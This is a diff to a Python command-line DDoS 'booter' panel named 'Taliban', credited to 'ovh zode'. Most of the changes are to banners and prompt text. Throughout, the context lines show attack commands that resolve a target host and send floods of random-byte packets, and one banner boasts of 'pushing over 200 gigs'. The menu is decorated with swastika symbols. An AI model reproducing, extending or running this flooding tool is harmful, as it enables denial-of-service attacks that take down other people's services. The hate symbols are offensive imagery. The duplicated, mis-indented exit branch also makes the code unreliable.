@@ -7,11 +7,27 @@ import random
 import threading
 import getpass
 import os
+welcome = """\033[91m
+        ▄▄▌ ▐ ▄▌▄▄▄ .▄▄▌   ▄▄·       • ▌ ▄ ·. ▄▄▄ .
+        ██· █▌▐█▀▄.▀·██•  ▐█ ▌▪ ▄█▀▄ ·██ ▐███▪▀▄.▀·
+        ██▪▐█▐▐▌▐▀▀▪▄██▪  ██ ▄▄▐█▌.▐▌▐█ ▌▐▌▐█·▐▀▀▪▄
+        ▐█▌██▐█▌▐█▄▄▌▐█▌▐▌▐███▌▐█▌.▐▌██ ██▌▐█▌▐█▄▄▌
+         ▀▀▀▀ ▀▪ ▀▀▀ .▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀▀▀ 
+        ╔══════════════════════════════════════════╗
+                      ⓣ ⓨ ⓟ ⓔ   ⓗ ⓞ ⓜ ⓔ 
+        ╚══════════════════════════════════════════╝
+"""
 
 methods = """\033[91m
-                                  ╦ ╦╔═╗╔╦╗╔═╗
-                                  ╠═╣║ ║║║║║╣
-                                  ╩ ╩╚═╝╩ ╩╚═╝𝑥𝑣
+
+                     (   (   ((       ( ( .  (    )    (  
+                     )\: )\ (\())\ )\ )\)\ . )\  (()   )\ 
+                     ((_)((_))(_)(_)(_)_)(_) ((_)()(_) ((_)
+                     |  \/  | __|_   _| || |/ _ \|   \/ __|
+                     | |\/| | _|  | | | __ | (_) | |) |__ \
+
+                     |_|  |_|___| |_| |_||_|\___/|___/|___/
+
 ╔═══════════════════════════════════════════════════════════════════════════════╗
           𝒪𝒱𝐻                         ℋ𝒪ℳℰ                         𝓝𝓕𝓞                               
 ╚═══════════════════════════════════════════════════════════════════════════════╝
@@ -41,13 +57,13 @@ info = """\033[91m
                           ╩┘└┘└  └─┘𝑥𝑣
    ╔════════════════════════════════════════════════════╗
    ║[+] Taliban Was Made By ovh zode                    ║ 
-   ║[+] Discord:zode#0001                               ║            
+   ║[+] Discord:zode#8857                               ║            
    ║[+] Instagram:ovh_zode                              ║
    ╚════════════════════════════════════════════════════╝       
 
 """
 
-extras = """\033[91m
+comingsoon = """\033[91m
                                  ╔═╗╔═╗╔═╗╔═╗╔═╗
                                  ╚═╗╠═╝║ ║║ ║╠╣
                                  ╚═╝╩  ╚═╝╚═╝╚𝑥𝑣
@@ -68,7 +84,7 @@ help = """\033[91m
        ║  卐                                                           卐  ║ 
        ║  卐                         help                              卐  ║
        ║  卐                         updates                           卐  ║       
-       ║  卐                         extras                            卐  ║      
+       ║  卐                         comingsoon                        卐  ║      
        ║  卐                         Info                              卐  ║	
        ║  卐                         methods                           卐  ║                              
        ║  卐                         exit                              卐  ║
@@ -90,22 +106,27 @@ updates = """\033[91m
 ╚════════════════════════════════════════╝
 """
 
-banner = """
+banner = """\033[91m
                    
-      ▄▄▄▄▄ ▄▄▄· ▄▄▌  ▪  ▄▄▄▄·  ▄▄▄·  ▐ ▄ ·▄▄▄▄
-      •██  ▐█ ▀█ ██•  ██ ▐█ ▀█▪▐█ ▀█ •█▌▐███▪ ██
-       ▐█.▪▄█▀▀█ ██▪  ▐█·▐█▀▀█▄▄█▀▀█ ▐█▐▐▌▐█· ▐█▌
-       ▐█▌·▐█ ▪▐▌▐█▌▐▌▐█▌██▄▪▐█▐█ ▪▐▌██▐█▌██. ██
-       ▀▀▀  ▀  ▀ .▀▀▀ ▀▀▀·▀▀▀▀  ▀  ▀ ▀▀ █▪▀▀▀▀▀• 
+                                                                         
+        ████████╗ █████╗ ██╗     ██╗██████╗  █████╗ ███╗   ██╗
+        ╚══██╔══╝██╔══██╗██║     ██║██╔══██╗██╔══██╗████╗  ██║
+           ██║   ███████║██║     ██║██████╔╝███████║██╔██╗ ██║
+           ██║   ██╔══██║██║     ██║██╔══██╗██╔══██║██║╚██╗██║
+           ██║   ██║  ██║███████╗██║██████╔╝██║  ██║██║ ╚████║
+           ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
 
-       💔😈        Welcome To Taliban          😈💔
-   ╔════════════════════════════════════════════════════╗
-   ║ - - - - - Welcome To Taliban v1- - - - - - - - - - ║
-   ║ - - - - - - - - - - - -Made By ovh zode  - - - - - ║
-   ╚════════════════════════════════════════════════════╝
-          ╔═══════╦═══════════════════════╦═══════╗
-          ║ - - - ║    𝙆𝙖𝙢𝙞𝙠𝙖𝙯𝙚𝘽𝙤𝙢𝙗𝙚𝙧     ║ - - - ║ 
-          ╚═══════╩═══════════════════════╩═══════╝ 
+                                                                         
+                                                                       
+            💔 😈        Welcome To Taliban          😈 💔
+        ╔════════════════════════════════════════════════════╗
+        ║ - - - - - Welcome To Taliban v3.6- - - - - - - - - ║
+        ║ - - - - - - - - - - - -Made By ovh zode  - - - - - ║
+        ╚════════════════════════════════════════════════════╝
+         ║         TALIBAN IS NOW PUSHING OVER 200 GIGS     ║        
+         ╚════════════╦═══════════════════════╦═════════════╝
+              ║ - - - ║     𝐓𝐀𝐋𝐈𝐁𝐀𝐍 𝐎𝐍 𝐓𝐎𝐏    ║ - - - ║ 
+              ╚═══════╩═══════════════════════╩═══════╝ 
 """
 cookie = open(".Taliban_Cookie","w+")
 fsubs = 0 
@@ -1064,9 +1085,9 @@ def main():
 
 	while True:
 
-		sys.stdout.write("\x1b]2;priority\x07")
+		sys.stdout.write("\x1b]2;Taliban NET\x07")
 
-		sin = input("\033[1;00m[\033[91mTaliban\033[1;00m] ").lower()
+		sin = input("\033[90m[\033[91mroot\033[90m]\033[91m⤳\033[91m ").lower()
 
 		sinput = sin.split(" ")[0]
 
@@ -1094,22 +1115,25 @@ def main():
 
 			main()
 
-		elif sinput == "extras":
+		elif sinput == "comingsoon":
 
 			os.system ("clear")
 
-			print (extras)
+			print (comingsoon)
 
 			main()
 
 		elif sinput == "exit":
 
+		    os.system ("clear")
+            
+		elif sinput == "exit":
+
 			os.system ("clear")
 
-			print ("[\033[91mTaliban\033[00m] You Are Exiting Out Of Taliban.\n")
+			print ("[\033[91mroot⤳\033[00m] You Are Exiting Out Of Taliban.\n")
 
 			exit()
-
 		elif sinput == "methods":
 
 			os.system ("clear")
@@ -1138,7 +1162,7 @@ def main():
 
 			os.system ("clear")
 
-			print ("[\033[91Taliban\033[00m] Total Attacks Running: {}\n".format (aid))
+			print ("[\033[91mroot⤳\033[00m] Total Attacks Running: {}\n".format (aid))
 
 			main()
 
@@ -1152,7 +1176,7 @@ def main():
 
 			host_ip = socket.gethostbyname(host)
 
-			print ("[\033[91mReaper\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
+			print ("[\033[91mroot⤳\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
 
 			main()
 
@@ -1164,7 +1188,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1172,20 +1196,20 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 		elif sinput == "arma":
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1196,7 +1220,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1204,13 +1228,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1218,7 +1242,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1229,7 +1253,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1237,13 +1261,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1251,7 +1275,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1262,7 +1286,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1270,13 +1294,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1284,7 +1308,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1295,7 +1319,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1303,13 +1327,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1317,7 +1341,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1328,7 +1352,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1336,13 +1360,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1350,7 +1374,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1361,7 +1385,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1369,13 +1393,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1383,7 +1407,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1394,7 +1418,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1402,13 +1426,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1416,7 +1440,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1427,7 +1451,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1435,13 +1459,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1449,7 +1473,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1460,7 +1484,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1468,13 +1492,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 					
@@ -1486,7 +1510,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1494,13 +1518,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1508,7 +1532,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1519,7 +1543,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1527,13 +1551,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1541,7 +1565,7 @@ def main():
 			
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()    
 			else:
@@ -1551,7 +1575,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1559,13 +1583,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1573,7 +1597,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -1585,7 +1609,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1593,13 +1617,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1611,7 +1635,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1619,13 +1643,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1633,7 +1657,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -1645,7 +1669,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1653,13 +1677,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1667,7 +1691,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -1679,7 +1703,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1687,13 +1711,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1705,7 +1729,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1713,13 +1737,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1731,7 +1755,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1739,13 +1763,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1757,7 +1781,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1765,13 +1789,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1783,7 +1807,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1791,13 +1815,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1811,7 +1835,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1819,13 +1843,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1837,7 +1861,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1845,13 +1869,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1859,7 +1883,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -1871,7 +1895,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1879,13 +1903,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1893,7 +1917,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -1905,7 +1929,7 @@ def main():
 
 					socket.gethostbyname(host)
 
-					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Attack Sent To: {}\n".format (host))
 
 					punch = random._urandom(int(pack))
 
@@ -1913,13 +1937,13 @@ def main():
 
 				except ValueError:
 
-					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mroot⤳\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 
 					main()
 
 				except socket.gaierror:
 
-					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mroot⤳\033[00m] Host: {} Invalid.\n".format (host))
 
 					main()
 
@@ -1927,7 +1951,7 @@ def main():
 
 			if username == "walker":
 
-				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mroot⤳\033[00m] You Are Not Allowed To Use This Method.\n")
 
 				main()
 
@@ -1939,7 +1963,7 @@ def main():
 
 					socket.gethostbyname(host)
 
